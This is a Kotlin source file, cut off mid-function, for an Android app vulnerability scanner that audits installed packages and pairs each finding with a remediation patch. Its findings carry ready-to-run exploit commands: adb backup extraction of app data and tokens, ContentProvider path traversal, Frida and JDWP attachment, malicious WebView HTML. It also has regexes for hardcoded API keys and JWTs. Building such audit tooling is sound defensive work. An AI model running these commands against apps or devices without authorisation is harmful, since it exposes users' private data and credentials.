package com.omnidev.workspace.data.tools.security

import android.content.Context
import android.content.Intent
import android.content.pm.PackageInfo
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.util.Log
import com.omnidev.workspace.data.tools.EnhancedAppManifestAnalyzerTool
import com.omnidev.workspace.data.tools.ShizukuCommandTool
import com.omnidev.workspace.data.tools.ShizukuResult
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.async
import kotlinx.coroutines.awaitAll
import kotlinx.coroutines.coroutineScope
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeoutOrNull
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.util.zip.ZipFile
import kotlin.math.min

// ═══════════════════════════════════════════════════════════════════════════════
// 🔬 ANDROID VULNERABILITY RESEARCH ENGINE
// Inspired by: DARPA AI Cyber Challenge, Project Glasswing, Anthropic's Opus 4.6
//
// Architecture (4 Phases):
//   Phase 1 → Static Discovery   (DEX strings, Manifest, Native libs, Crypto)
//   Phase 2 → Dynamic Probing    (Live intent fuzzing, ContentProvider probing)
//   Phase 3 → Exploit PoC        (Confirm findings via controlled shell execution)
//   Phase 4 → Remediation        (Generate patches + hardening advice)
// ═══════════════════════════════════════════════════════════════════════════════

// ─── Data Model ──────────────────────────────────────────────────────────────

enum class VulnCategory(val cwe: String, val displayName: String) {
    ACTIVITY_HIJACKING("CWE-926", "Activity Hijacking"),
    SERVICE_HIJACKING("CWE-926", "Service Hijacking"),
    BROADCAST_THEFT("CWE-927", "Broadcast Theft"),
    CONTENT_PROVIDER_INJECTION("CWE-89", "Content Provider SQL Injection"),
    PATH_TRAVERSAL("CWE-22", "Path Traversal via Intent"),
    DEEPLINK_INJECTION("CWE-601", "Deep Link URI Injection"),
    WEBVIEW_JS_INTERFACE("CWE-79", "WebView addJavascriptInterface Exposure"),
    WEBVIEW_FILE_ACCESS("CWE-200", "WebView Arbitrary File Read"),
    WEBVIEW_UNIVERSAL_ACCESS("CWE-942", "WebView Universal File Access"),
    CRYPTO_WEAK_ALGO("CWE-327", "Weak Cryptographic Algorithm"),
    CRYPTO_HARDCODED_KEY("CWE-321", "Hardcoded Cryptographic Key"),
    CRYPTO_INSECURE_RANDOM("CWE-338", "Insecure Pseudo-Random Number Generator"),
    NETWORK_CLEARTEXT("CWE-319", "Cleartext Transmission"),
    NETWORK_CERT_BYPASS("CWE-295", "Certificate Validation Bypass"),
    STORAGE_WORLD_READABLE("CWE-732", "World-Readable Shared Preferences"),
    STORAGE_SDCARD("CWE-922", "Sensitive Data on External Storage"),
    LOG_DISCLOSURE("CWE-532", "Sensitive Data in Logs"),
    DEBUGGABLE("CWE-215", "Debuggable Flag Enabled"),
    BACKUP_ENABLED("CWE-530", "ADB Backup Enabled"),
    PENDING_INTENT_MUTABLE("CWE-927", "Mutable PendingIntent"),
    IMPLICIT_INTENT_HIJACK("CWE-925", "Implicit Intent Broadcast Hijack"),
    FRAGMENT_INJECTION("CWE-470", "Fragment Injection"),
    TAPJACKING("CWE-1021", "Tapjacking / UI Overlay"),
    SQL_INJECTION("CWE-89", "SQL Injection in ContentProvider"),
    COMMAND_INJECTION("CWE-78", "Shell Command Injection"),
    NATIVE_DANGEROUS_FUNC("CWE-676", "Dangerous Native Function"),
    SERIALIZATION_GADGET("CWE-502", "Deserialization of Untrusted Data"),
    CLIPBOARD_LEAKAGE("CWE-200", "Clipboard Sensitive Data Leakage"),
    EXPORTED_UNPROTECTED("CWE-284", "Exported Component Without Permission Guard"),
}

enum class Severity(val score: Float, val emoji: String) {
    CRITICAL(9.0f, "🔴"),
    HIGH(7.5f, "🟠"),
    MEDIUM(5.0f, "🟡"),
    LOW(2.5f, "🟢"),
    INFO(0.5f, "⚪")
}

enum class VerificationStatus {
    CONFIRMED,      // PoC succeeded, vulnerability is real
    LIKELY,         // Strong static evidence, dynamic probe inconclusive
    UNVERIFIED,     // Only static indicators, no dynamic confirmation
    FALSE_POSITIVE  // Dynamic probe disproved the static finding
}

data class ExploitPoC(
    val shellCommand: String,       // Ready-to-run ADB/Shizuku command
    val description: String,
    val expectedOutcome: String,
    val verificationResult: String? = null  // Filled after execution
)

data class RemediationSuggestion(
    val summary: String,
    val codeSnippet: String,       // Kotlin/Java patch
    val manifestChange: String?,   // AndroidManifest.xml change if needed
    val proguardRule: String?,     // ProGuard rule if needed
    val references: List<String>
)

data class VulnerabilityFinding(
    val id: String,
    val category: VulnCategory,
    val severity: Severity,
    val title: String,
    val description: String,
    val location: String,           // File/class/line where found
    val evidence: String,           // What triggered this finding
    val exploitPoCs: List<ExploitPoC>,
    val verificationStatus: VerificationStatus,
    val cvssScore: Float,
    val remediation: RemediationSuggestion
)

data class ResearchReport(
    val packageName: String,
    val label: String,
    val analysisTimestampMs: Long,
    val phasesCompleted: List<String>,
    val findings: List<VulnerabilityFinding>,
    val riskScore: Int,             // 0–100
    val attackSurfaceSummary: String,
    val topPriorities: List<String>,
    val patchBundle: String,        // All patches consolidated
    val duration: Long              // ms
) {
    fun toJson(): JSONObject {
        val root = JSONObject()
        root.put("package", packageName)
        root.put("label", label)
        root.put("timestamp", analysisTimestampMs)
        root.put("riskScore", riskScore)
        root.put("phasesCompleted", JSONArray(phasesCompleted))
        root.put("findingCount", findings.size)
        root.put("criticalCount", findings.count { it.severity == Severity.CRITICAL })
        root.put("highCount", findings.count { it.severity == Severity.HIGH })
        root.put("confirmedCount", findings.count { it.verificationStatus == VerificationStatus.CONFIRMED })
        root.put("attackSurface", attackSurfaceSummary)
        root.put("durationMs", duration)

        val findingsArr = JSONArray()
        findings.forEach { f ->
            val fj = JSONObject()
            fj.put("id", f.id)
            fj.put("category", f.category.name)
            fj.put("cwe", f.category.cwe)
            fj.put("severity", f.severity.name)
            fj.put("cvss", f.cvssScore)
            fj.put("title", f.title)
            fj.put("description", f.description)
            fj.put("location", f.location)
            fj.put("evidence", f.evidence)
            fj.put("verificationStatus", f.verificationStatus.name)
            val pocArr = JSONArray()
            f.exploitPoCs.forEach { poc ->
                val pj = JSONObject()
                pj.put("command", poc.shellCommand)
                pj.put("description", poc.description)
                pj.put("expected", poc.expectedOutcome)
                poc.verificationResult?.let { pj.put("verificationResult", it) }
                pocArr.put(pj)
            }
            fj.put("exploitPoCs", pocArr)
            fj.put("remediation", f.remediation.summary)
            fj.put("patchCode", f.remediation.codeSnippet)
            f.remediation.manifestChange?.let { fj.put("manifestFix", it) }
            findingsArr.put(fj)
        }
        root.put("findings", findingsArr)
        root.put("topPriorities", JSONArray(topPriorities))
        root.put("patchBundle", patchBundle)
        return root
    }
}

// ─── Main Engine ──────────────────────────────────────────────────────────────

object AndroidVulnResearchEngine {

    private const val TAG = "VulnResearch"

    // Timeout per dynamic probe (ms)
    private const val PROBE_TIMEOUT_MS = 4000L
    // Max DEX strings to scan (prevent OOM on huge apps)
    private const val MAX_DEX_STRINGS = 80_000

    // ═══ Entry Point ════════════════════════════════════════════════════════

    suspend fun runFullResearch(
        context: Context,
        packageName: String,
        phases: Set<ResearchPhase> = ResearchPhase.entries.toSet()
    ): ResearchReport = withContext(Dispatchers.IO) {
        val startMs = System.currentTimeMillis()
        val completedPhases = mutableListOf<String>()
        val allFindings = mutableListOf<VulnerabilityFinding>()

        val pm = context.packageManager
        val packageInfo = loadPackageInfo(pm, packageName)
            ?: return@withContext emptyReport(packageName, "Package not found", startMs)

        val label = packageInfo.applicationInfo?.let { pm.getApplicationLabel(it).toString() } ?: packageName
        val apkPath = packageInfo.applicationInfo?.sourceDir

        // ── Phase 1: Static Analysis ──────────────────────────────────────
        if (ResearchPhase.STATIC in phases) {
            val staticFindings = coroutineScope {
                val manifestJob = async { analyzeManifest(context, pm, packageInfo, packageName) }
                val dexJob = async { if (apkPath != null) analyzeDex(apkPath, packageName) else emptyList() }
                val nativeJob = async { if (apkPath != null) analyzeNativeLibs(apkPath, packageName) else emptyList() }
                val cryptoJob = async { if (apkPath != null) analyzeCrypto(apkPath, packageName) else emptyList() }
                listOf(manifestJob, dexJob, nativeJob, cryptoJob).awaitAll().flatten()
            }
            allFindings.addAll(staticFindings)
            completedPhases.add("STATIC (${staticFindings.size} findings)")
        }

        // ── Phase 2: Dynamic Probing ──────────────────────────────────────
        if (ResearchPhase.DYNAMIC in phases && ShizukuCommandTool.isAvailable()) {
            val dynamicFindings = runDynamicProbes(context, pm, packageInfo, packageName, allFindings)
            allFindings.addAll(dynamicFindings)
            completedPhases.add("DYNAMIC (${dynamicFindings.size} findings)")
        } else if (ResearchPhase.DYNAMIC in phases) {
            completedPhases.add("DYNAMIC (skipped — Shizuku unavailable)")
        }

        // ── Phase 3: Exploit Verification ────────────────────────────────
        if (ResearchPhase.EXPLOIT_VERIFY in phases && ShizukuCommandTool.isAvailable()) {
            val verified = verifyExploits(allFindings)
            allFindings.clear()
            allFindings.addAll(verified)
            val confirmed = verified.count { it.verificationStatus == VerificationStatus.CONFIRMED }
            completedPhases.add("EXPLOIT_VERIFY ($confirmed confirmed)")
        }

        // ── Phase 4: Remediation ─────────────────────────────────────────
        // Remediation is built inline per finding — consolidate here
        val patchBundle = buildPatchBundle(packageName, allFindings)
        completedPhases.add("REMEDIATION (${allFindings.size} patches generated)")

        val riskScore = calculateRiskScore(allFindings)
        val topPriorities = allFindings
            .filter { it.severity >= Severity.HIGH }
            .sortedByDescending { it.cvssScore }
            .take(5)
            .map { "${it.severity.emoji} ${it.title} — ${it.category.cwe}" }

        ResearchReport(
            packageName = packageName,
            label = label,
            analysisTimestampMs = System.currentTimeMillis(),
            phasesCompleted = completedPhases,
            findings = allFindings.sortedByDescending { it.cvssScore },
            riskScore = riskScore,
            attackSurfaceSummary = buildAttackSurfaceSummary(pm, packageInfo),
            topPriorities = topPriorities,
            patchBundle = patchBundle,
            duration = System.currentTimeMillis() - startMs
        )
    }

    enum class ResearchPhase { STATIC, DYNAMIC, EXPLOIT_VERIFY }

    // ═══ Phase 1: Static Analysis ═══════════════════════════════════════════

    private fun analyzeManifest(
        context: Context,
        pm: PackageManager,
        packageInfo: PackageInfo,
        pkg: String
    ): List<VulnerabilityFinding> {
        val findings = mutableListOf<VulnerabilityFinding>()
        val appInfo = packageInfo.applicationInfo ?: return findings

        // ── Debuggable ────────────────────────────────────────────────────
        if ((appInfo.flags and android.content.pm.ApplicationInfo.FLAG_DEBUGGABLE) != 0) {
            findings += VulnerabilityFinding(
                id = "MANIFEST-001",
                category = VulnCategory.DEBUGGABLE,
                severity = Severity.CRITICAL,
                title = "Application is Debuggable",
                description = "android:debuggable=true allows any app to attach a debugger via ADB JDWP. " +
                        "Attacker can inspect memory, extract secrets, and manipulate execution flow at runtime.",
                location = "AndroidManifest.xml → <application>",
                evidence = "ApplicationInfo.FLAG_DEBUGGABLE is set",
                exploitPoCs = listOf(
                    ExploitPoC(
                        shellCommand = "adb shell am attach-agent $pkg /data/local/tmp/frida-agent.so",
                        description = "Attach Frida agent to running process",
                        expectedOutcome = "Full runtime instrumentation capability"
                    ),
                    ExploitPoC(
                        shellCommand = "adb jdwp  # find PID, then: adb forward tcp:5005 jdwp:<PID>",
                        description = "Attach Java debugger via JDWP",
                        expectedOutcome = "Breakpoint, memory inspection, method interception"
                    )
                ),
                verificationStatus = VerificationStatus.CONFIRMED,
                cvssScore = 9.1f,
                remediation = RemediationSuggestion(
                    summary = "Remove android:debuggable=true from <application> tag (or ensure it's false in release builds).",
                    codeSnippet = """
                        // In build.gradle.kts (release config):
                        buildTypes {
                            release {
                                isDebuggable = false  // ensures no debug builds reach production
                            }
                        }
                    """.trimIndent(),
                    manifestChange = """<application android:debuggable="false" ...>""",
                    proguardRule = null,
                    references = listOf("https://developer.android.com/topic/security/risks/android-debuggable")
                )
            )
        }

        // ── Backup Enabled ────────────────────────────────────────────────
        if ((appInfo.flags and android.content.pm.ApplicationInfo.FLAG_ALLOW_BACKUP) != 0) {
            findings += VulnerabilityFinding(
                id = "MANIFEST-002",
                category = VulnCategory.BACKUP_ENABLED,
                severity = Severity.HIGH,
                title = "ADB Backup Enabled",
                description = "android:allowBackup=true allows full data extraction via 'adb backup' without root on API <31. " +
                        "Private databases, shared prefs, tokens, and session files are all exposed.",
                location = "AndroidManifest.xml → <application>",
                evidence = "ApplicationInfo.FLAG_ALLOW_BACKUP is set",
                exploitPoCs = listOf(
                    ExploitPoC(
                        shellCommand = "adb backup -apk -f backup.ab $pkg && dd if=backup.ab bs=24 skip=1 | python3 -c \"import zlib,sys; sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))\" | tar xvf -",
                        description = "Extract full app data directory via ADB backup",
                        expectedOutcome = "Access to databases, shared_prefs, files — including auth tokens"
                    )
                ),
                verificationStatus = VerificationStatus.CONFIRMED,
                cvssScore = 7.5f,
                remediation = RemediationSuggestion(
                    summary = "Disable backup or use BackupAgent to exclude sensitive files.",
                    codeSnippet = """
                        // Option 1: Disable entirely
                        // <application android:allowBackup="false" ...>

                        // Option 2: Custom BackupAgent to exclude sensitive files
                        class SecureBackupAgent : BackupAgentHelper() {
                            override fun onCreate() {
                                // Only include non-sensitive files
                                addHelper("prefs", SharedPreferencesBackupHelper(this, "app_settings"))
                                // Do NOT add helper for databases or token stores
                            }
                        }
                    """.trimIndent(),
                    manifestChange = """<application android:allowBackup="false" ...>""",
                    proguardRule = null,
                    references = listOf("https://developer.android.com/guide/topics/data/autobackup#ControllingBackup")
                )
            )
        }

        // ── Exported Activities without permission guard ───────────────────
        packageInfo.activities?.filter { act ->
            act.exported && (EnhancedAppManifestAnalyzerTool.getComponentPermission(act) == null)
        }?.forEachIndexed { idx, act ->
            val shortName = act.name.removePrefix(pkg)
            findings += VulnerabilityFinding(
                id = "MANIFEST-ACT-${idx.toString().padStart(3, '0')}",
                category = VulnCategory.EXPORTED_UNPROTECTED,
                severity = Severity.HIGH,
                title = "Unprotected Exported Activity: $shortName",
                description = "Activity is exported with no android:permission guard. Any app on the device can launch it, " +
                        "potentially bypassing authentication screens or exposing internal functionality.",
                location = "AndroidManifest.xml → <activity android:name=\"${act.name}\">",
                evidence = "exported=true, permission=null",
                exploitPoCs = listOf(
                    ExploitPoC(
                        shellCommand = "am start -n $pkg/${act.name}",
                        description = "Launch activity directly from shell/any app",
                        expectedOutcome = "Activity launches without authentication or permission check"
                    )
                ),
                verificationStatus = VerificationStatus.UNVERIFIED,
                cvssScore = 7.2f,
                remediation = generateActivityRemediationSuggestion(pkg, act.name, idx)
            )
        }

        // ── Exported Services without permission ──────────────────────────
        packageInfo.services?.filter { svc ->
            svc.exported && (EnhancedAppManifestAnalyzerTool.getComponentPermission(svc) == null)
        }?.forEachIndexed { idx, svc ->
            val shortName = svc.name.removePrefix(pkg)
            findings += VulnerabilityFinding(
                id = "MANIFEST-SVC-${idx.toString().padStart(3, '0')}",
                category = VulnCategory.SERVICE_HIJACKING,
                severity = Severity.MEDIUM,
                title = "Unprotected Exported Service: $shortName",
                description = "Service is exported without a permission guard. Any malicious app can bind to it " +
                        "or start it with crafted Intents, potentially triggering unintended operations.",
                location = "AndroidManifest.xml → <service android:name=\"${svc.name}\">",
                evidence = "exported=true, permission=null",
                exploitPoCs = listOf(
                    ExploitPoC(
                        shellCommand = "am startservice -n $pkg/${svc.name} --es action TRIGGER",
                        description = "Start service with crafted action",
                        expectedOutcome = "Service executes with attacker-supplied extras"
                    )
                ),
                verificationStatus = VerificationStatus.UNVERIFIED,
                cvssScore = 5.8f,
                remediation = RemediationSuggestion(
                    summary = "Add android:permission to protect the service, or set android:exported=false if not needed externally.",
                    codeSnippet = """
                        // In AndroidManifest.xml:
                        <service android:name="${svc.name}"
                                 android:exported="false" />
                        // OR with permission guard:
                        <service android:name="${svc.name}"
                                 android:permission="com.${pkg.substringAfterLast('.')}.permission.BIND_SERVICE" />
                    """.trimIndent(),
                    manifestChange = """<service android:name="${svc.name}" android:exported="false" />""",
                    proguardRule = null,
                    references = listOf("https://developer.android.com/guide/topics/manifest/service-element")
                )
            )
        }

        // ── Exported Content Providers ────────────────────────────────────
        packageInfo.providers?.filter { prov ->
            prov.exported && prov.readPermission == null && prov.writePermission == null
        }?.forEachIndexed { idx, prov ->
            prov.authority?.split(";")?.forEach { auth ->
                findings += VulnerabilityFinding(
                    id = "MANIFEST-PRV-${idx.toString().padStart(3, '0')}",
                    category = VulnCategory.CONTENT_PROVIDER_INJECTION,
                    severity = Severity.HIGH,
                    title = "Unprotected ContentProvider: $auth",
                    description = "ContentProvider exported with no read/write permission. Any app can query, insert, " +
                            "update, or delete data via content:// URIs. May expose internal databases.",
                    location = "AndroidManifest.xml → <provider authority=\"$auth\">",
                    evidence = "exported=true, readPermission=null, writePermission=null",
                    exploitPoCs = listOf(
                        ExploitPoC(
                            shellCommand = "content query --uri content://$auth/",
                            description = "Query all data from ContentProvider without any permission",
                            expectedOutcome = "Dump of internal database tables / file paths"
                        ),
                        ExploitPoC(
                            shellCommand = "content query --uri \"content://$auth/../../../data/data/$pkg/databases/main.db\"",
                            description = "Path traversal attempt to read arbitrary files",
                            expectedOutcome = "Unauthorized file read if traversal not sanitized"
                        )
                    ),
                    verificationStatus = VerificationStatus.UNVERIFIED,
                    cvssScore = 8.2f,
                    remediation = RemediationSuggestion(
                        summary = "Add readPermission and writePermission to ContentProvider. Use URI permissions for granular control.",
                        codeSnippet = """
                            // In your ContentProvider.query() implementation:
                            override fun query(uri: Uri, ...): Cursor? {
                                // Sanitize path — block traversal
                                val segment = uri.pathSegments.firstOrNull()
                                require(segment != null && segment.matches(Regex("[A-Za-z0-9_]+"))) {
                                    "Invalid path segment"
                                }
                                // Use parameterized queries ONLY:
                                return db.query(TABLE, projection, "${'$'}ID_COLUMN = ?", arrayOf(segment), null, null, sortOrder)
                            }
                        """.trimIndent(),
                        manifestChange = """
                            <provider android:name="${prov.name}"
                                      android:readPermission="com.${pkg.substringAfterLast('.')}.permission.READ"
                                      android:writePermission="com.${pkg.substringAfterLast('.')}.permission.WRITE"
                                      android:exported="true" />
                        """.trimIndent(),
                        proguardRule = null,
                        references = listOf(
                            "https://developer.android.com/guide/topics/providers/content-provider-creating#Permissions",
                            "https://owasp.org/www-project-mobile-top-10/"
                        )
                    )
                )
            }
        }

        // ── Exported Receivers ────────────────────────────────────────────
        packageInfo.receivers?.filter { rcv ->
            rcv.exported && EnhancedAppManifestAnalyzerTool.getComponentPermission(rcv) == null
        }?.forEachIndexed { idx, rcv ->
            findings += VulnerabilityFinding(
                id = "MANIFEST-RCV-${idx.toString().padStart(3, '0')}",
                category = VulnCategory.BROADCAST_THEFT,
                severity = Severity.MEDIUM,
                title = "Unprotected Broadcast Receiver: ${rcv.name.removePrefix(pkg)}",
                description = "Receiver exported without a permission guard — any app can send crafted broadcasts to trigger it.",
                location = "AndroidManifest.xml → <receiver android:name=\"${rcv.name}\">",
                evidence = "exported=true, permission=null",
                exploitPoCs = listOf(
                    ExploitPoC(
                        shellCommand = "am broadcast -n $pkg/${rcv.name} -a android.intent.action.CUSTOM --es payload 'INJECT'",
                        description = "Send crafted broadcast to receiver",
                        expectedOutcome = "Receiver processes attacker-controlled payload"
                    )
                ),
                verificationStatus = VerificationStatus.UNVERIFIED,
                cvssScore = 5.3f,
                remediation = RemediationSuggestion(
                    summary = "Add android:permission or use LocalBroadcastManager for internal broadcasts.",
                    codeSnippet = """
                        // Replace global broadcast with local:
                        LocalBroadcastManager.getInstance(context)
                            .sendBroadcast(Intent("com.example.ACTION"))
                        // And register locally:
                        LocalBroadcastManager.getInstance(context)
                            .registerReceiver(receiver, IntentFilter("com.example.ACTION"))
                    """.trimIndent(),
                    manifestChange = """<receiver android:name="${rcv.name}" android:exported="false" />""",
                    proguardRule = null,
                    references = listOf("https://developer.android.com/reference/androidx/localbroadcastmanager/content/LocalBroadcastManager")
                )
            )
        }

        return findings
    }

    // ── DEX String Analysis ──────────────────────────────────────────────

    private fun analyzeDex(apkPath: String, pkg: String): List<VulnerabilityFinding> {
        val findings = mutableListOf<VulnerabilityFinding>()
        val strings = extractDexStrings(apkPath)
        if (strings.isEmpty()) return findings

        val joined = strings.joinToString("\n")

        // ── WebView JS Interface ──────────────────────────────────────────
        if (strings.any { it.contains("addJavascriptInterface", ignoreCase = true) }) {
            findings += VulnerabilityFinding(
                id = "DEX-WEBVIEW-001",
                category = VulnCategory.WEBVIEW_JS_INTERFACE,
                severity = Severity.HIGH,
                title = "WebView.addJavascriptInterface() Usage",
                description = "JavaScript interfaces bound to WebView expose all annotated methods to any page loaded in it. " +
                        "On API < 17, ALL public methods are exposed. Malicious web content can call Java/Kotlin code directly.",
                location = "DEX bytecode (string reference search)",
                evidence = "'addJavascriptInterface' found in DEX strings",
                exploitPoCs = listOf(
                    ExploitPoC(
                        shellCommand = """
                            # Craft malicious HTML served locally:
                            echo '<html><script>window.injectedInterface.executeCommand("id")</script></html>' > /tmp/exploit.html
                            adb push /tmp/exploit.html /sdcard/exploit.html
                            am start -n $pkg/.MainActivity -d file:///sdcard/exploit.html
                        """.trimIndent(),
                        description = "Load malicious HTML that calls exposed Java interface methods",
                        expectedOutcome = "Arbitrary Java code execution in the app's context"
                    )
                ),
                verificationStatus = VerificationStatus.UNVERIFIED,
                cvssScore = 8.8f,
                remediation = RemediationSuggestion(
                    summary = "Add @JavascriptInterface annotation to EVERY exposed method (required on API≥17). Load only trusted origins. " +
                            "Prefer postMessage() over JS interfaces for cross-origin communication.",
                    codeSnippet = """
                        // Annotate ONLY the methods you intend to expose:
                        class SafeInterface {
                            @JavascriptInterface
                            fun allowedMethod(input: String): String {
                                // Validate input rigorously before processing
                                require(input.matches(Regex("[A-Za-z0-9 ]{1,100}")))
                                return processInput(input)
                            }
                            // DO NOT expose sensitive methods (e.g., file I/O, SQLite, reflection)
                        }
                        // Load only trusted URIs:
                        webView.loadUrl("https://yourdomain.com/trusted-path")
                    """.trimIndent(),
                    manifestChange = null,
                    proguardRule = "-keepclassmembers class * { @android.webkit.JavascriptInterface <methods>; }",
                    references = listOf("https://developer.android.com/reference/android/webkit/JavascriptInterface")
                )
            )
        }

        // ── WebView File Access ───────────────────────────────────────────
        if (strings.any { it.contains("setAllowFileAccess", ignoreCase = true) ||
                    it.contains("setAllowUniversalAccessFromFileURLs", ignoreCase = true) }) {
            findings += VulnerabilityFinding(
                id = "DEX-WEBVIEW-002",
                category = VulnCategory.WEBVIEW_FILE_ACCESS,
                severity = Severity.HIGH,
                title = "WebView File Access Enabled",
                description = "setAllowFileAccess(true) or setAllowUniversalAccessFromFileURLs(true) allows JavaScript in the WebView " +
                        "to read arbitrary files from the app's data directory.",
                location = "DEX bytecode (setAllowFileAccess / setAllowUniversalAccessFromFileURLs)",
                evidence = "WebView file access API calls found in DEX",
                exploitPoCs = listOf(
                    ExploitPoC(
                        shellCommand = """am start -n $pkg/.MainActivity -d "file:///data/data/$pkg/shared_prefs/user.xml" """,
                        description = "Force WebView to load app's shared preferences via file:// URI",
                        expectedOutcome = "Display of sensitive preference data in WebView"
                    )
                ),
                verificationStatus = VerificationStatus.UNVERIFIED,
                cvssScore = 7.4f,
                remediation = RemediationSuggestion(
                    summary = "Disable file access unless strictly required. Never enable universal file access.",
                    codeSnippet = """
                        webView.settings.apply {
                            allowFileAccess = false               // Disable file:// access
                            allowFileAccessFromFileURLs = false   // Prevent file:// XSS
                            allowUniversalAccessFromFileURLs = false // NEVER enable this
                        }
                    """.trimIndent(),
                    manifestChange = null,
                    proguardRule = null,
                    references = listOf("https://developer.android.com/reference/android/webkit/WebSettings#setAllowFileAccess(boolean)")
                )
            )
        }

        // ── Weak Crypto ───────────────────────────────────────────────────
        val weakAlgos = listOf("MD5", "SHA-1", "DES", "RC4", "RC2", "ECB", "NoPadding")
        val foundWeakAlgos = weakAlgos.filter { algo ->
            strings.any { s -> s.contains(algo, ignoreCase = true) }
        }
        if (foundWeakAlgos.isNotEmpty()) {
            findings += VulnerabilityFinding(
                id = "DEX-CRYPTO-001",
                category = VulnCategory.CRYPTO_WEAK_ALGO,
                severity = Severity.HIGH,
                title = "Weak Cryptographic Algorithm: ${foundWeakAlgos.joinToString(", ")}",
                description = "Deprecated cryptographic algorithms found: ${foundWeakAlgos.joinToString(", ")}. " +
                        "These are cryptographically broken and must not be used for security-sensitive operations.",
                location = "DEX bytecode (MessageDigest/Cipher API)",
                evidence = "Weak algorithm strings: ${foundWeakAlgos.joinToString(", ")}",
                exploitPoCs = listOf(
                    ExploitPoC(
                        shellCommand = "# MD5 collision: generate two files with same hash in seconds on commodity hardware",
                        description = "MD5 preimage/collision attacks are computationally trivial",
                        expectedOutcome = "Hash bypass, file spoofing, signature forgery"
                    )
                ),
                verificationStatus = VerificationStatus.CONFIRMED, // Static evidence is definitive
                cvssScore = 7.5f,
                remediation = RemediationSuggestion(
                    summary = "Replace weak algorithms with modern equivalents.",
                    codeSnippet = """
                        // ❌ BROKEN — Do NOT use:
                        // MessageDigest.getInstance("MD5")
                        // MessageDigest.getInstance("SHA-1")
                        // Cipher.getInstance("DES/ECB/NoPadding")
                        
                        // ✅ SAFE alternatives:
                        // Hashing: SHA-256 or SHA-3
                        val digest = MessageDigest.getInstance("SHA-256")
                        
                        // Symmetric encryption: AES-256-GCM (authenticated)
                        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
                        val keySpec = SecretKeySpec(key, "AES")
                        val gcmSpec = GCMParameterSpec(128, iv)
                        cipher.init(Cipher.ENCRYPT_MODE, keySpec, gcmSpec)
                        
                        // Password hashing: use Android Keystore + PBKDF2
                        val factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256")
                        val spec = PBEKeySpec(password, salt, 600_000, 256)
                    """.trimIndent(),
                    manifestChange = null,
                    proguardRule = null,
                    references = listOf(
                        "https://developer.android.com/privacy-and-security/cryptography",
                        "https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography"
                    )
                )
            )
        }

        // ── Hardcoded Secrets ─────────────────────────────────────────────
        val secretPatterns = listOf(
            Regex("""(?i)(api[_\-]?key|secret|password|token|private[_\-]?key)\s*[:=]\s*["']([A-Za-z0-9/+=_\-]{16,})["']"""),
            Regex("""AKIA[A-Z0-9]{16}"""),                                        // AWS Access Key
            Regex("""eyJ[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+"""),  // JWT
            Regex("""sk-[A-Za-z0-9]{32,}"""),                                     // OpenAI key
            Regex("""AIza[0-9A-Za-z\-_]{35}"""),                                   // Google API key
        )
        val secretMatches = secretPatterns.flatMapIndexed { i, pattern ->
            pattern.findAll(joined).take(3).map { "Pattern[$i]: ${it.value.take(60)}" }
        }
        if (secretMatches.isNotEmpty()) {
            findings += VulnerabilityFinding(
                id = "DEX-CRYPTO-002",
                category = VulnCategory.CRYPTO_HARDCODED_KEY,
                severity = Severity.CRITICAL,
                title = "Hardcoded Credentials / API Keys in DEX",
                description = "Hardcoded secrets found in DEX bytecode. These are trivially extractable with strings(1), " +
                        "jadx, or apktool by any attacker who downloads the APK.",
                location = "DEX bytecode (string pool)",
                evidence = secretMatches.take(5).joinToString("\n"),
                exploitPoCs = listOf(
                    ExploitPoC(
                        shellCommand = "apktool d $pkg.apk -o out && grep -r 'api_key\\|password\\|secret\\|token' out/smali/ | head -50",
                        description = "Extract hardcoded secrets from decompiled Smali",
                        expectedOutcome = "Full secret values readable in plain text"
                    )
                ),
                verificationStatus = VerificationStatus.LIKELY,
                cvssScore = 9.8f,
                remediation = RemediationSuggestion(
                    summary = "Store secrets in Android Keystore, not in source code. Load API keys from server-side at runtime.",
                    codeSnippet = """
                        // ❌ NEVER DO THIS:
                        // private val API_KEY = "sk-abc123xyz..."
                        
                        // ✅ Option 1: Android Keystore (for symmetric keys)
                        val keyStore = KeyStore.getInstance("AndroidKeyStore").also { it.load(null) }
                        val key = keyStore.getKey("MY_KEY_ALIAS", null) as? SecretKey
                        
                        // ✅ Option 2: Fetch from secure server at runtime (with cert pinning)
                        // ✅ Option 3: Use BuildConfig for non-sensitive debug keys only
                        // BuildConfig.DEBUG_KEY — never put production keys here
                        
                        // ✅ Rotate compromised credentials IMMEDIATELY via provider dashboard
                    """.trimIndent(),
                    manifestChange = null,
                    proguardRule = null,
                    references = listOf("https://developer.android.com/privacy-and-security/keystore")
                )
            )
        }

        // ── Insecure Logging ──────────────────────────────────────────────
        val logPatterns = listOf("Log.d", "Log.v", "Log.i", "System.out.print", "printStackTrace")
        val loggingFound = logPatterns.filter { pattern ->
            strings.any { it.contains(pattern, ignoreCase = true) }
        }
        if (loggingFound.isNotEmpty()) {
            // Only flag if combined with sensitive keywords nearby
            val sensitiveNearLog = listOf("password", "token", "secret", "key", "ssn", "credit", "card", "auth")
            val sensitiveLogged = sensitiveNearLog.any { sensitive ->
                strings.any { s -> s.contains(sensitive, ignoreCase = true) }
            }
            if (sensitiveLogged) {
                findings += VulnerabilityFinding(
                    id = "DEX-LOG-001",
                    category = VulnCategory.LOG_DISCLOSURE,
                    severity = Severity.MEDIUM,
                    title = "Potential Sensitive Data in Logs",
                    description = "Logging calls (${loggingFound.joinToString(", ")}) found alongside sensitive keyword strings. " +
                            "On debug builds, any app with READ_LOGS permission can read logcat output.",
                    location = "DEX bytecode",
                    evidence = "Log APIs + sensitive keywords co-present in DEX",
                    exploitPoCs = listOf(
                        ExploitPoC(
                            shellCommand = "adb logcat -d | grep -iE 'password|token|secret|key|auth' | head -50",
                            description = "Read sensitive values from logcat",
                            expectedOutcome = "Credentials, tokens, or PII in plaintext log output"
                        )
                    ),
                    verificationStatus = VerificationStatus.UNVERIFIED,
                    cvssScore = 5.5f,
                    remediation = RemediationSuggestion(
                        summary = "Use a logging wrapper that strips sensitive fields in release builds.",
                        codeSnippet = """
                            object SafeLog {
                                fun d(tag: String, msg: String) {
